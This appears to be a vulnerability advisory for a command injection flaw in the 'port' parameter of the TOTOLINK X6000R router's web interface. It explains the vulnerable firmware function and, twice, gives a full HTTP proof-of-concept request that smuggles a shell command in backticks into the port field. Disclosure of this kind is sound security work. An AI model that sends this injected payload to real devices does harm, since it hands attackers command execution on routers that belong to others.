# Summary
There is a command execution vulnerability in TOTOLINK X6000R(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is parameter **`port`** of `sub_4119A0` function in `/usr/sbin/shttpd` binary file.

**Notice**:
I checked **all the currently disclosed CVEs** and found that the affected parameters in the currently exposed sub_4119A0 are:
- [ ] interval
- [ ] pass
- [ ] enable
- [ ] url
- [ ] informEnable
- [ ] user
- [ ] stun_user
- [ ] request_user
- [ ] request_pass
- [ ] stun_enable
- [ ] stunServerAddr

However, parameters
- [ ] **port**
- [ ] **stunPort**
- [ ] **stunMaxAlive**
- [ ] **stunMinAlive**

are ignored.

# Details
Funtion `sub_4119A0` get `port` from user's input and use `Uci_Set_Str`, which leads to command execution:
![image](https://github.com/user-attachments/assets/5ec0c1f8-cdc9-4617-acd1-273c87f4f95d)

`Uci_Set_Str`:
![image](https://github.com/user-attachments/assets/fec24bc9-d13a-4c0f-bcd0-57a605e68383)

`CsteSystem`:
![image](https://github.com/user-attachments/assets/c55d454e-996d-451d-b21a-837127736d69)

The corresponding front-end web interface is here:
![image](https://github.com/user-attachments/assets/12ba6593-3d59-4390-ad1b-fbf1e3d9d2a6)

However, there is no port parameter when directly capturing packets, so we just need to add it ourselves:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=FE46010A2414AC06 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 318
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/tr069_cfg.html?token=FE46010A2414AC06
Priority: u=1

{"addEffect":"0","enable":"1","url":"www.awa.com","user":"1","pass":"1","informEnable":"0","interval":"","requestUser":"","requestPass":"",
"port":"`ls >/web/poc_port.txt`",
"stun_user":"","stun_pass":"","stunEnable":"0","stunServerAddr":"","stunPort":"","stunMaxAlive":"","stunMinAlive":"","topicurl":"setTr069Cfg"}
```

![image](https://github.com/user-attachments/assets/d90c955b-8e4e-4cd5-b4ad-fd584c870b96)

![image](https://github.com/user-attachments/assets/52be5e76-35d8-4c9f-a4f7-d98a72990d5a)


# PoC
Login first,
```HTTP
POST /cgi-bin/cstecgi.cgi?token=FE46010A2414AC06 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 318
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/tr069_cfg.html?token=FE46010A2414AC06
Priority: u=1

{"addEffect":"0","enable":"1","url":"www.awa.com","user":"1","pass":"1","informEnable":"0","interval":"","requestUser":"","requestPass":"",
"port":"`ls >/web/poc_port.txt`",
"stun_user":"","stun_pass":"","stunEnable":"0","stunServerAddr":"","stunPort":"","stunMaxAlive":"","stunMinAlive":"","topicurl":"setTr069Cfg"}
```

![image](https://github.com/user-attachments/assets/d90c955b-8e4e-4cd5-b4ad-fd584c870b96)

![image](https://github.com/user-attachments/assets/52be5e76-35d8-4c9f-a4f7-d98a72990d5a)
